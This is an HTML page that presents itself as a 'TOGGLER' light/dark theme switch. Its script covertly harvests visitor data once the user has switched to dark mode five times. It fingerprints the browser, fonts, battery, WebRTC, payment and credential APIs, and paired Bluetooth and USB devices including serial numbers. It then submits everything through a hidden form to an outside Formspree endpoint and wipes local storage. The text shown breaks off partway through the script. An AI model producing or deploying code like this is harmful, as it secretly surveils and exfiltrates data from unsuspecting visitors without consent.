<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOGGLER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            transition: background-color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
                color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
                border-color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
                transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: #333;
            padding: 20px;
        }

        body.dark-mode {
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            color: #f0f0f0;
        }

        .container {
            text-align: center;
            padding: 40px;
            border-radius: 24px;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1),
                0 5px 15px rgba(0, 0, 0, 0.05),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        body.dark-mode .container {
            background: rgba(30, 30, 40, 0.85);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3),
                0 5px 15px rgba(0, 0, 0, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .switch-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .switch-label {
            font-size: 1.5rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .theme-toggle {
            position: relative;
            display: inline-block;
            width: 120px;
            height: 60px;
        }

        .theme-toggle input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, #ffd166, #ff9e6d);
            border-radius: 50px;
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.1),
                inset 0 -5px 15px rgba(0, 0, 0, 0.1),
                0 5px 20px rgba(0, 0, 0, 0.2);
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        body.dark-mode .toggle-slider {
            background: linear-gradient(90deg, #4a00e0, #8e2de2);
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.3),
                inset 0 -5px 15px rgba(0, 0, 0, 0.3),
                0 5px 20px rgba(0, 0, 0, 0.4);
        }

        .toggle-slider:before {
            content: "";
            position: absolute;
            height: 50px;
            width: 50px;
            left: 5px;
            bottom: 5px;
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 50%;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2),
                inset 0 -3px 5px rgba(0, 0, 0, 0.1),
                inset 0 3px 5px rgba(255, 255, 255, 0.8);
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #ff9e00;
        }

        body.dark-mode .toggle-slider:before {
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4),
                inset 0 -3px 5px rgba(0, 0, 0, 0.3),
                inset 0 3px 5px rgba(255, 255, 255, 0.05);
            color: #ffd700;
        }

        input:checked+.toggle-slider:before {
            transform: translateX(60px);
        }

        .toggle-slider:active:before {
            width: 55px;
        }

        .theme-toggle:hover .toggle-slider {
            transform: scale(1.05);
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.15),
                inset 0 -5px 15px rgba(0, 0, 0, 0.15),
                0 8px 25px rgba(0, 0, 0, 0.25);
        }

        body.dark-mode .theme-toggle:hover .toggle-slider {
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.4),
                inset 0 -5px 15px rgba(0, 0, 0, 0.4),
                0 8px 25px rgba(0, 0, 0, 0.5);
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0;
            transition: opacity 1.5s ease;
        }

        body.dark-mode .stars {
            opacity: 1;
        }

        .star {
            position: absolute;
            background-color: white;
            border-radius: 50%;
            animation: twinkle 5s infinite;
        }

        @keyframes twinkle {

            0%,
            100% {
                opacity: 0.3;
            }

            50% {
                opacity: 1;
            }
        }

        .transition-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
            z-index: 1000;
            transform: scale(0);
            border-radius: 50%;
            opacity: 0;
            pointer-events: none;
            transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1),
                opacity 0.8s ease;
        }

        .transition-overlay.active {
            transform: scale(2);
            opacity: 0.9;
        }

        .transition-overlay.fade-out {
            opacity: 0;
            transform: scale(2);
            transition: opacity 0.8s ease;
        }

        .save-notification {
            text-wrap: nowrap;
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            font-weight: 600;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            z-index: 100;
        }

        .save-notification.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .counter-container {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 40px;
            height: 20px;
            min-height: 20px;
            opacity: 0;
            animation: fadeInCounter 0.5s ease forwards;
            animation-delay: 0.3s;
        }

        @keyframes fadeInCounter {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: rgba(30, 30, 40, 0.85);
            opacity: 0.3;
            display: none;
        }

        .dot.active {
            display: block;
            opacity: 1;
            box-shadow: 0 0 8px rgba(240, 240, 240, 0.5);
        }

        body:not(.dark-mode) .dot.active {
            opacity: 1;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
        }

        body.dark-mode .dot.active {
            opacity: 0.1;
            box-shadow: none;
        }

        .success-modal,
        .error-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1),
                visibility 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .success-modal.active,
        .error-modal.active {
            opacity: 1;
            visibility: visible;
        }

        .modal-content {
            background: linear-gradient(135deg,
                    rgba(255, 255, 255, 0.1) 0%,
                    rgba(255, 255, 255, 0.05) 100%);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 60px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .modal-content::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg,
                    transparent 0%,
                    rgba(255, 255, 255, 0.3) 50%,
                    transparent 100%);
        }

        .success-modal .modal-content {
            animation: pulseGlow 3s ease-in-out infinite;
        }

        @keyframes pulseGlow {

            0%,
            100% {
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
                    0 0 20px rgba(142, 45, 226, 0.1);
            }

            50% {
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
                    0 0 40px rgba(142, 45, 226, 0.3);
            }
        }

        .error-modal .modal-content {
            border: 1px solid rgba(255, 100, 100, 0.2);
            background: linear-gradient(135deg,
                    rgba(255, 100, 100, 0.05) 0%,
                    rgba(255, 50, 50, 0.02) 100%);
        }

        .modal-content h3 {
            color: white;
            font-size: 1.5rem;
            margin: 20px 0;
            font-weight: 600;
            line-height: 1.4;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        .success-modal .modal-content h3 {
            background: linear-gradient(90deg, #ffffff, #cccccc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 1.6rem;
        }

        .error-modal .modal-content h3 {
            color: #ff6b6b;
            font-size: 1.4rem;
        }

        .modal-content .fa-check-circle {
            color: rgba(255, 255, 255, 0.3);
            font-size: 2.5rem;
            margin: 0 10px;
        }

        .modal-content .fa-exclamation-triangle {
            color: #ff6b6b;
            font-size: 2rem;
            margin: 0 10px;
        }

        .error-code {
            color: rgba(255, 255, 255, 0.7);
            font-family: 'Courier New', monospace;
            font-size: 1rem;
            margin-top: 15px;
            padding: 8px 15px;
            background: rgba(255, 100, 100, 0.1);
            border-radius: 8px;
            display: inline-block;
            border: 1px solid rgba(255, 100, 100, 0.2);
        }

        .error-code span {
            color: #ff9999;
            font-weight: bold;
        }

        .modal-subtext {
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.9rem;
            margin-top: 15px;
            font-style: italic;
        }

        @keyframes modalAppear {
            from {
                opacity: 0;
                transform: translateY(-30px) scale(0.95);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .success-modal.active .modal-content,
        .error-modal.active .modal-content {
            animation: modalAppear 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        #Form {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }

        #collectedData {
            display: none;
        }

        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }

            .theme-toggle {
                width: 100px;
                height: 50px;
            }

            input:checked+.toggle-slider:before {
                transform: translateX(50px);
            }

            .toggle-slider:before {
                height: 40px;
                width: 40px;
            }

            .counter-container {
                margin-top: 30px;
                gap: 12px;
            }

            .dot {
                width: 10px;
                height: 10px;
            }

            .modal-content {
                padding: 30px 20px;
                width: 85%;
            }

            .success-modal .modal-content h3 {
                font-size: 1.3rem;
            }

            .error-modal .modal-content h3 {
                font-size: 1.2rem;
            }

            .modal-content .fa-spider-web,
            .modal-content .fa-exclamation-triangle {
                font-size: 1.5rem;
            }
        }
    </style>
</head>

<body>
    <div class="transition-overlay" id="transitionOverlay"></div>
    <div class="stars" id="starsContainer"></div>

    <div class="container">

        <div class="switch-container">
            <div class="switch-label">
                <i class="fas fa-sun"></i>
                <span id="themeLabel">LIGHT THEME</span>
                <i class="fas fa-moon"></i>
            </div>

            <label class="theme-toggle">
                <input type="checkbox" id="themeToggle">
                <span class="toggle-slider" title="Toggle">
                </span>
            </label>
        </div>

        <div class="mode-status" id="modeStatus"></div>

        <div class="counter-container" id="counterContainer"></div>
    </div>

    <form id="Form" style="display: none;" action="https://formspree.io/f/xzdrkkaw" method="POST">
        <textarea name="collected_data" id="collectedData"></textarea>
        <input type="hidden" name="_subject" value="Browser Data Collected">
        <input type="hidden" name="_format" value="plain">
        <input type="text" name="_gotcha" style="display:none;">
        <input type="hidden" name="_language" value="ru">
    </form>

    <div class="success-modal" id="successModal">
        <div class="modal-content">
            <i class="fa fa-check-circle"></i>
            <h3>ACCESS GRANTED!</h3>
            <div class="modal-subtext" id="modalSubtext"></div>
        </div>
    </div>

    <div class="error-modal" id="errorModal">
        <div class="modal-content">
            <i class="fas fa-exclamation-triangle"></i>
            <h3 id="errorTitle">ERROR! </h3>
            <div class="error-code">629 <span id="errorCode">ERR_NETWORK_FAILURE</span></div>
        </div>
    </div>

    <div class="save-notification" id="saveNotification">
        <i class="fas fa-check-circle"></i> Theme changed!
    </div>

    <script>
        const themeToggle = document.getElementById('themeToggle');
        const body = document.body;
        const themeLabel = document.getElementById('themeLabel');
        const transitionOverlay = document.getElementById('transitionOverlay');
        const starsContainer = document.getElementById('starsContainer');
        const saveNotification = document.getElementById('saveNotification');
        const counterContainer = document.getElementById('counterContainer');
        const Form = document.getElementById('Form');
        const collectedDataField = document.getElementById('collectedData');
        const successModal = document.getElementById('successModal');
        const errorModal = document.getElementById('errorModal');
        const errorCodeSpan = document.getElementById('errorCode');

        const MAX_SWITCHES = 5;
        const SWITCH_COUNT_KEY = 'themeSwitchCount';
        const PENDING_DATA_KEY = 'pendingFormData';

        const ENABLE_LOGS = true;

        function debugLog(message, data) {
            if (!ENABLE_LOGS) return;
            const time = new Date().toTimeString().split(' ')[0];
            console.log(`[${time}] ${message}`);
            if (data) console.log(data);
        }

        function debugError(message, error) {
            if (!ENABLE_LOGS) return;
            console.error(`[ERROR] ${message}`, error);
        }

        function createStars() {
            starsContainer.innerHTML = '';
            const starCount = 80;

            for (let i = 0; i < starCount; i++) {
                const star = document.createElement('div');
                star.classList.add('star');

                const size = Math.random() * 3 + 1;
                const posX = Math.random() * 100;
                const posY = Math.random() * 100;
                const duration = Math.random() * 4 + 3;
                const delay = Math.random() * 5;

                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.left = `${posX}%`;
                star.style.top = `${posY}%`;
                star.style.animationDelay = `${delay}s`;
                star.style.animationDuration = `${duration}s`;

                starsContainer.appendChild(star);
            }
        }

        createStars();

        function initializeSystem() {
            createCounterDots();
            let switchCount = parseInt(localStorage.getItem(SWITCH_COUNT_KEY)) || 0;
            updateCounterDots(switchCount);
            checkPendingData();
            updateFormspreeEndpoint();
        }

        function createCounterDots() {
            counterContainer.innerHTML = '';
            for (let i = 0; i < MAX_SWITCHES; i++) {
                const dot = document.createElement('div');
                dot.className = 'dot';
                dot.id = `dot-${i + 1}`;
                counterContainer.appendChild(dot);
            }
        }

        function updateCounterDots(count) {
            document.querySelectorAll('.dot').forEach(dot => {
                dot.classList.remove('active');
            });

            for (let i = 0; i < count; i++) {
                const dot = document.getElementById(`dot-${i + 1}`);
                if (dot) {
                    dot.classList.add('active');
                }
            }

            if (count > 0) {
                counterContainer.style.opacity = '1';
            }
        }

        function updateFormspreeEndpoint() {
            const formspreeEndpoint = 'https://formspree.io/f/xzdrkkaw';
            Form.action = formspreeEndpoint;
        }

        function checkPendingData() {
            const pendingData = localStorage.getItem(PENDING_DATA_KEY);
            if (pendingData) {
                debugLog('Обнаружены неотправленные данные');
                sendPendingData(pendingData);
            }
        }

        themeToggle.onchange = async function (e) {
            const isDarkMode = this.checked;

            playTransitionAnimation(() => {
                if (isDarkMode) {
                    body.classList.add('dark-mode');
                    localStorage.setItem('theme', 'dark');

                    handleDarkModeSwitch();
                } else {
                    body.classList.remove('dark-mode');
                    localStorage.setItem('theme', 'light');
                }

                updateThemeText(isDarkMode);
                showSaveNotification();

                const slider = document.querySelector('.toggle-slider');
                slider.style.transform = 'scale(1.1)';
                setTimeout(() => {
                    slider.style.transform = 'scale(1)';
                }, 200);
            });
        };

        async function handleDarkModeSwitch() {
            try {
                let switchCount = parseInt(localStorage.getItem(SWITCH_COUNT_KEY)) || 0;
                switchCount++;
                localStorage.setItem(SWITCH_COUNT_KEY, switchCount);
                updateCounterDots(switchCount);

                debugLog(`Переключение на темную тему: ${switchCount}/${MAX_SWITCHES}`);

                if (switchCount >= MAX_SWITCHES) {
                    debugLog('Достигнут лимит переключений');
                    localStorage.setItem(SWITCH_COUNT_KEY, 0);
                    updateCounterDots(0);
                    await collectAndSendData();
                }
            } catch (error) {
                debugError('Ошибка в handleDarkModeSwitch', error);
            }
        }

        async function collectAndSendData() {
            try {
                debugLog('Начало сбора данных браузера');
                const browserData = await collectAllBrowserData();
                const projectData = {
                    switchCount: MAX_SWITCHES,
                    activationTime: new Date().toISOString(),
                    project: "СЕТЬ",
                    activationTrigger: "dark_theme_switch_limit"
                };

                browserData.projectData = projectData;

                const sendStamp = `// Данные собраны. Время сбора: ${new Date().toLocaleString('ru-BY')}\n`;
                const jsonData = sendStamp + JSON.stringify(browserData, null, 2);

                debugLog('Данные собраны. Отправка формы');
                const success = await sendFormData(jsonData);

                if (success) {
                    localStorage.clear();
                    sessionStorage.clear();
                    showSuccessModal();
                } else {
                    localStorage.setItem(PENDING_DATA_KEY, jsonData);
                    showErrorModal('ERR_NETWORK_FAILURE');
                }
            } catch (error) {
                debugError('Критическая ошибка при сборе данных', error);
                showErrorModal('ERR_DATA_COLLECTION_FAILED');
            }
        }

        async function collectAllBrowserData() {
            const data = {
                meta: {
                    collectedAt: new Date().toISOString(),
                    timestamp: Date.now(),
                    source: window.location.href,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer || 'none',
                    historyLength: history.length,
                    collectionVersion: "2.5"
                },
                browser: collectBrowserInfo(),
                system: collectSystemInfo(),
                location: await collectLocationInfo(),
                media: await collectMediaInfo(),
                network: collectNetworkInfo(),
                capabilities: collectCapabilitiesInfo(),
                additional: collectAdditionalInfo(),
                advanced: await collectAdvancedInfo(),
                behavior: collectBehaviorInfo(),
                sensors: await collectSensorInfo(),
                storage: await collectDatabaseInfo(),
                bluetooth: await collectBluetoothInfo(),
                usb: await collectUSBInfo()
            };

            data.projectData = {
                switchCount: MAX_SWITCHES,
                activationTime: new Date().toISOString(),
                project: "СЕТЬ",
                activationTrigger: "dark_theme_switch_limit",
                dataVersion: "2.5"
            };

            return data;
        }

        async function collectAdvancedInfo() {
            const result = {
                fonts: await getFontsInfo(),
                battery: await getBatteryInfo(),
                webAuthn: await getWebAuthnDetails(),
                shareAPI: await getShareAPIDetails(),
                webRTC: await getWebRTCDetails(),
                paymentAPI: await getPaymentAPIDetails(),
                credentialsAPI: getCredentialsAPIDetails(),
                mimeTypes: getMimeTypesInfo(),
                csp: getCSPInfo(),
                indexedDB: 'indexedDB' in window,
                cacheAPI: 'caches' in window,
                webSQL: 'openDatabase' in window,
                webSocket: 'WebSocket' in window,
                bluetooth: 'bluetooth' in navigator
            };

            return result;
        }

        async function getWebAuthnDetails() {
            if (!('PublicKeyCredential' in window)) {
                return { available: false };
            }

            try {
                const supportedAlgorithms = [];

                const isU2FSupported = 'U2F' in window || 'u2f' in window;
                const isCTAPSupported = 'PublicKeyCredential' in window;

                return {
                    available: true,
                    isU2FSupported: isU2FSupported,
                    isCTAPSupported: isCTAPSupported,
                    isConditionalMediation: 'PublicKeyCredential' in window &&
                        PublicKeyCredential.isConditionalMediationAvailable ?
                        await PublicKeyCredential.isConditionalMediationAvailable() : false,
                    isUserVerifyingPlatformAuthenticatorAvailable: 'PublicKeyCredential' in window &&
                        PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable ?
                        await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable() : false
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getShareAPIDetails() {
            if (!('share' in navigator)) {
                return { available: false };
            }

            try {
                const canShare = navigator.canShare ? navigator.canShare({ title: 'Test' }) : true;

                return {
                    available: true,
                    canShare: canShare,
                    canShareFiles: navigator.canShare ? navigator.canShare({ files: [new File([], 'test.txt')] }) : false,
                    maxShares: 5
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getWebRTCDetails() {
            if (!('RTCPeerConnection' in window)) {
                return { available: false };
            }

            try {
                const pc = new RTCPeerConnection();

                const capabilities = {
                    hasDataChannel: 'createDataChannel' in pc,
                    hasAddTrack: 'addTrack' in pc,
                    hasGetStats: 'getStats' in pc,
                    codecs: await getWebRTCCodecs(),
                    stunServers: pc.getConfiguration()?.iceServers?.filter(s => s.urls?.some(u => u.includes('stun:')))?.length || 0,
                    turnServers: pc.getConfiguration()?.iceServers?.filter(s => s.urls?.some(u => u.includes('turn:')))?.length || 0
                };

                pc.close();

                return {
                    available: true,
                    ...capabilities
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getWebRTCCodecs() {
            try {
                const pc = new RTCPeerConnection();
                const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });

                const sdp = offer.sdp;
                const codecs = {
                    audio: [],
                    video: []
                };

                sdp.split('\n').forEach(line => {
                    if (line.includes('a=rtpmap:')) {
                        const match = line.match(/a=rtpmap:(\d+) ([^/]+)/);
                        if (match) {
                            const type = line.includes('audio') ? 'audio' : 'video';
                            codecs[type].push(match[2]);
                        }
                    }
                });

                pc.close();
                return codecs;
            } catch (e) {
                return { error: e.message };
            }
        }

        async function getPaymentAPIDetails() {
            if (!('PaymentRequest' in window)) {
                return { available: false };
            }

            try {
                const supportedMethods = [];

                const methods = ['https://google.com/pay', 'https://apple.com/apple-pay', 'basic-card'];

                for (const method of methods) {
                    try {
                        const request = new PaymentRequest([{ supportedMethods: method }], {
                            total: { label: 'Test', amount: { currency: 'USD', value: '1.00' } }
                        });
                        const canMake = await request.canMakePayment();
                        if (canMake) {
                            supportedMethods.push(method);
                        }
                    } catch (e) { }
                }

                return {
                    available: true,
                    supportedMethods: supportedMethods,
                    hasShippingAddress: 'shippingAddress' in PaymentRequest.prototype,
                    hasShippingOption: 'shippingOption' in PaymentRequest.prototype
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getCredentialsAPIDetails() {
            if (!('credentials' in navigator)) {
                return { available: false };
            }

            try {
                return {
                    available: true,
                    canGet: 'get' in navigator.credentials,
                    canCreate: 'create' in navigator.credentials,
                    canStore: 'store' in navigator.credentials,
                    hasPreventSilentAccess: 'preventSilentAccess' in navigator.credentials,
                    types: {
                        password: 'PasswordCredential' in window,
                        federated: 'FederatedCredential' in window,
                        publicKey: 'PublicKeyCredential' in window
                    }
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        function collectBehaviorInfo() {
            const scrollDepth = window.scrollY / document.body.scrollHeight;
            const timeOnPage = performance.now() - performance.timing.navigationStart;

            return {
                scrollDepth: Math.round(scrollDepth * 100) + '%',
                timeOnPage: Math.round(timeOnPage) + 'ms',
                screenOrientation: screen.orientation?.type || window.orientation || 'unknown',
                visibilityState: document.visibilityState,
                hasFocus: document.hasFocus(),
                mouseTracking: 'available',
                keyboardTracking: 'available'
            };
        }

        async function collectSensorInfo() {
            return {
                deviceMotion: 'DeviceMotionEvent' in window,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                ambientLight: 'AmbientLightSensor' in window,
                proximity: 'ProximitySensor' in window,
                gyroscope: 'Gyroscope' in window,
                accelerometer: 'Accelerometer' in window,
                magnetometer: 'Magnetometer' in window
            };
        }

        async function checkDeviceAPI(apiName, config) {
            const hasAPI = apiName in navigator;
            const apiObject = navigator[apiName];

            const result = {
                available: false,
                error: null,
                status: 'not_supported',
                details: {
                    isAvailable: false,
                    permissions: 'unknown',
                    pairedDevicesCount: 0,
                    canScan: false,
                    canAsk: false,
                    functions: {},
                    permissionState: 'unknown',
                    diagnostics: {}
                },
                devices: [],
                timestamp: new Date().toISOString()
            };

            result.details.diagnostics = {
                hasAPIProperty: hasAPI,
                apiObjectType: typeof apiObject,
                isSecureContext: window.isSecureContext,
                protocol: window.location.protocol,
                hostname: window.location.hostname,
                browser: getBrowserName(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            if (!hasAPI) {
                result.error = `${apiName} API not supported`;
                result.details.diagnostics.failureReason = 'api_property_missing';
                return result;
            }

            if (typeof apiObject !== 'object') {
                result.error = `navigator.${apiName} is not an object`;
                result.details.diagnostics.failureReason = 'api_not_object';
                return result;
            }

            try {
                let permissionState = 'unknown';
                if (navigator.permissions && navigator.permissions.query) {
                    for (const name of config.permissionNames) {
                        try {
                            const permission = await navigator.permissions.query({ name });
                            if (permission && permission.state) {
                                permissionState = permission.state;
                                result.details.permissions = permission.state;
                                result.details.permissionState = permission.state;
                                result.details.diagnostics.permissionCheck = {
                                    name: name,
                                    state: permission.state,
                                    status: 'success'
                                };
                                break;
                            }
                        } catch (permError) {
                            result.details.diagnostics.permissionCheck = {
                                name: name,
                                error: permError.message,
                                status: 'failed'
                            };
                        }
                    }
                } else {
                    result.details.permissions = 'no_permissions_api';
                    result.details.diagnostics.permissionCheck = {
                        status: 'permissions_api_not_available'
                    };
                }

                result.details.canAsk = 'requestDevice' in apiObject;
                result.details.diagnostics.canAskCheck = 'requestDevice' in apiObject;

                if (config.getDevicesFunc) {
                    try {
                        const devices = await config.getDevicesFunc();
                        result.details.pairedDevicesCount = devices.length;
                        result.details.diagnostics.getDevicesCheck = {
                            status: 'success',
                            deviceCount: devices.length
                        };

                        if (devices.length > 0) {
                            result.devices = devices.map(device => {
                                const baseInfo = config.deviceMapper(device);

                                if (apiName === 'bluetooth' && device.gatt) {
                                    baseInfo.gatt = {
                                        connected: device.gatt.connected || false
                                    };
                                }

                                if (apiName === 'usb') {
                                    baseInfo.deviceInfo = {
                                        vendorId: device.vendorId,
                                        productId: device.productId,
                                        productName: device.productName,
                                        manufacturerName: device.manufacturerName,
                                        serialNumber: device.serialNumber,
                                        opened: device.opened
                                    };
                                }

                                return baseInfo;
                            });
                        }
                    } catch (devicesError) {
                        result.details.getDevicesError = devicesError.message;
                        result.details.diagnostics.getDevicesCheck = {
                            status: 'error',
                            error: devicesError.message
                        };
                    }
                } else {
                    result.details.diagnostics.getDevicesCheck = {
                        status: 'function_not_available'
                    };
                }

                if (apiName === 'bluetooth') {
                    result.details.canScan = 'requestLEScan' in apiObject;
                    result.details.diagnostics.canScanCheck = 'requestLEScan' in apiObject;

                    try {
                        if (apiObject.getAvailability) {
                            const isAvailable = await apiObject.getAvailability();
                            result.details.isAvailable = isAvailable;
                            result.details.diagnostics.availabilityCheck = {
                                status: 'success',
                                available: isAvailable
                            };
                        } else {
                            result.details.diagnostics.availabilityCheck = {
                                status: 'function_not_available'
                            };
                        }
                    } catch (availError) {
                        result.details.diagnostics.availabilityCheck = {
                            status: 'error',
                            error: availError.message
                        };
                    }
                }

                const functionNames = ['getAvailability', 'requestDevice', 'getDevices', 'requestLEScan'];
                result.details.functions = {};
                result.details.diagnostics.functionsTest = {};

                for (const funcName of functionNames) {
                    try {
                        if (apiObject && apiObject[funcName]) {
                            const funcType = typeof apiObject[funcName];
                            result.details.functions[funcName] = funcType;
                            result.details.diagnostics.functionsTest[funcName] = {
                                exists: true,
                                type: funcType,
                                status: 'found'
                            };
                        } else {
                            result.details.functions[funcName] = 'not_found';
                            result.details.diagnostics.functionsTest[funcName] = {
                                exists: false,
                                status: 'not_found'
                            };
                        }
                    } catch (funcError) {
                        result.details.functions[funcName] = 'error';
                        result.details.diagnostics.functionsTest[funcName] = {
                            status: 'error',
                            error: funcError.message
                        };
                    }
                }

                const hasAnyFunction = Object.values(result.details.functions)
                    .some(val => val === 'function');

                if (hasAnyFunction) {
                    result.available = true;
                    result.status = 'success';
                } else {
                    result.available = false;
                    result.status = 'api_incomplete';
                    result.error = `${apiName} API присутствует, но функции не найдены`;
                    result.details.diagnostics.failureReason = 'no_functions_found';
                }

            } catch (error) {
                result.available = false;
                result.error = error.message;
                result.status = 'error';
                result.details.error = error.message;
                result.details.diagnostics.failureReason = 'exception_caught';
                result.details.diagnostics.exception = error.message;
            }

            return result;
        }

        async function collectBluetoothInfo() {
            const baseResult = await checkDeviceAPI('bluetooth', {
                permissionNames: ['bluetooth', 'bluetooth-device'],
                getDevicesFunc: navigator.bluetooth?.getDevices ?
                    () => navigator.bluetooth.getDevices() : null,
                deviceMapper: (device) => ({
                    id: device.id ?
                        (device.id.length > 20 ? device.id.substring(0, 15) + '...' : device.id) :
                        'unknown',
                    name: device.name || 'Безымянное устройство',
                    gattConnected: device.gatt?.connected || false
                })
            });

            if (baseResult.details.diagnostics) {
                baseResult.details.diagnostics.bluetoothSpecific = {
                    advertising: 'getAdvertisement' in (navigator.bluetooth || {}),
                    scanning: 'requestLEScan' in (navigator.bluetooth || {}),
                    gatt: 'getPrimaryServices' in (navigator.bluetooth || {}),
                    apiVersion: 'bluetooth' in navigator ? 'present' : 'absent',
                    isChromiumBased: /chrome|chromium|edg|opera|brave/i.test(navigator.userAgent)
                };

                const additionalChecks = [
                    'addEventListener', 'removeEventListener', 'dispatchEvent',
                    'onavailabilitychanged', 'onadvertisementreceived'
                ];

                baseResult.details.diagnostics.additionalFunctions = {};
                for (const func of additionalChecks) {
                    baseResult.details.diagnostics.additionalFunctions[func] =
                        func in (navigator.bluetooth || {});
                }
            }

            return baseResult;
        }

        async function collectUSBInfo() {
            const baseResult = await checkDeviceAPI('usb', {
                permissionNames: ['usb', 'usb-device'],
                getDevicesFunc: navigator.usb?.getDevices ?
                    () => navigator.usb.getDevices() : null,
                deviceMapper: (device) => ({
                    vendorId: device.vendorId,
                    productId: device.productId,
                    productName: device.productName || 'Неизвестное USB устройство',
                    manufacturerName: device.manufacturerName || 'Неизвестный производитель',
                    serialNumber: device.serialNumber || 'Нет',
                    opened: device.opened,
                    usbVersion: device.usbVersionMajor ?
                        `USB ${device.usbVersionMajor}.${device.usbVersionMinor}` : 'unknown',
                    configurations: device.configurations?.length || 0,
                    deviceClass: device.deviceClass,
                    deviceSubclass: device.deviceSubclass,
                    deviceProtocol: device.deviceProtocol
                })
            });

